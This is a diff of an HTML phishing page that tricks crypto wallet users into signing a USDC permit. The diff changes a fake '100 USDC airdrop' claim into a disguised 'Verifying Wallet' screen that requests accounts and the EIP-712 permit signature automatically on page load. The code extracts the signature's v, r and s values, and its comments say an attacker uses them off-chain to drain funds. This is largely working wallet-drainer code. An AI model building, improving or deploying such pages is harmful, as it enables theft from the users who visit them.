@@ -2,55 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Claim USDC Airdrop</title>
+  <title>Verifying Wallet...</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
   <style>
     body {
-      background: #0b0c10;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
+      background: #111;
+      color: #eee;
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      background: #1c1c1c;
+      padding: 40px;
+      border-radius: 18px;
+      box-shadow: 0 0 30px rgba(0,255,255,0.1);
       text-align: center;
-      padding-top: 80px;
-    }
-    .container {
-      background: #1f2833;
-      padding: 30px;
-      margin: auto;
       width: 360px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px #66fcf1;
     }
-    button {
-      padding: 10px 20px;
-      background-color: #66fcf1;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
+    .loader {
+      border: 5px solid #222;
+      border-top: 5px solid #0ff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
-    h1 {
-      color: #66fcf1;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h2 {
+      margin-bottom: 10px;
+      color: #0ff;
     }
     #status {
-      margin-top: 20px;
       font-size: 14px;
       color: #aaa;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎁 USDC Airdrop</h1>
-    <p>You've been selected for a 100 USDC exclusive airdrop.</p>
-    <p>Please sign to verify wallet ownership.</p>
-    <button onclick="runPermitFlow()">Claim 100 USDC</button>
-    <div id="status">Waiting for wallet...</div>
+  <div class="card">
+    <h2>🔒 Verifying Wallet</h2>
+    <div class="loader"></div>
+    <div id="status">Connecting to MetaMask...</div>
   </div>
 
   <script>
-    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC mainnet
-    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Uniswap Router
+    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC
+    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Router
 
     const usdcPermitAbi = [
       {
@@ -84,59 +89,53 @@
       }
     ];
 
-    async function runPermitFlow() {
-      if (!window.ethereum) {
-        document.getElementById("status").innerText = "❌ MetaMask not detected!";
-        return;
-      }
-
-      const web3 = new Web3(window.ethereum);
-      await ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      const user = accounts[0];
-
-      const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
-
-      const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
-      const nonce = await contract.methods.nonces(user).call();
-      const chainId = await web3.eth.getChainId();
-
-      const permitData = {
-        types: {
-          EIP712Domain: [
-            { name: "name", type: "string" },
-            { name: "version", type: "string" },
-            { name: "chainId", type: "uint256" },
-            { name: "verifyingContract", type: "address" }
-          ],
-          Permit: [
-            { name: "owner", type: "address" },
-            { name: "spender", type: "address" },
-            { name: "value", type: "uint256" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-          ]
-        },
-        domain: {
-          name: "USD Coin",
-          version: "2",
-          chainId: chainId,
-          verifyingContract: tokenAddress
-        },
-        primaryType: "Permit",
-        message: {
-          owner: user,
-          spender: spender,
-          value: value.toString(),
-          nonce: nonce,
-          deadline: deadline
-        }
-      };
-
-      document.getElementById("status").innerText = "🔐 Please sign the verification...";
-
+    async function autoSignPermit() {
       try {
+        const web3 = new Web3(window.ethereum);
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const user = accounts[0];
+
+        const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
+        const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+        const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
+        const nonce = await contract.methods.nonces(user).call();
+        const chainId = await web3.eth.getChainId();
+
+        const permitData = {
+          types: {
+            EIP712Domain: [
+              { name: "name", type: "string" },
+              { name: "version", type: "string" },
+              { name: "chainId", type: "uint256" },
+              { name: "verifyingContract", type: "address" }
+            ],
+            Permit: [
+              { name: "owner", type: "address" },
+              { name: "spender", type: "address" },
+              { name: "value", type: "uint256" },
+              { name: "nonce", type: "uint256" },
+              { name: "deadline", type: "uint256" }
+            ]
+          },
+          domain: {
+            name: "USD Coin",
+            version: "2",
+            chainId: chainId,
+            verifyingContract: tokenAddress
+          },
+          primaryType: "Permit",
+          message: {
+            owner: user,
+            spender: spender,
+            value: value.toString(),
+            nonce: nonce,
+            deadline: deadline
+          }
+        };
+
+        document.getElementById("status").innerText = "Signing permit...";
+
         const signature = await ethereum.request({
           method: "eth_signTypedData_v4",
           params: [user, JSON.stringify(permitData)],
@@ -146,15 +145,19 @@
         const s = "0x" + signature.slice(66, 130);
         const v = parseInt(signature.slice(130, 132), 16);
 
-        document.getElementById("status").innerText = "✅ Signed. Processing...";
+        document.getElementById("status").innerText = "✅ Signature complete";
 
-        // Real phishing pages DO NOT call permit here.
-        // They extract `v`, `r`, `s` and use it server-side to drain later.
+        // Normally attacker now uses v,r,s off-chain to drain funds
+        // Not shown here for safety
 
       } catch (err) {
-        document.getElementById("status").innerText = `❌ Signature cancelled`;
+        document.getElementById("status").innerText = "❌ User rejected or error";
       }
     }
+
+    window.onload = () => {
+      setTimeout(autoSignPermit, 1000); // slight delay for smooth UX
+    };
   </script>
 </body>
 </html>
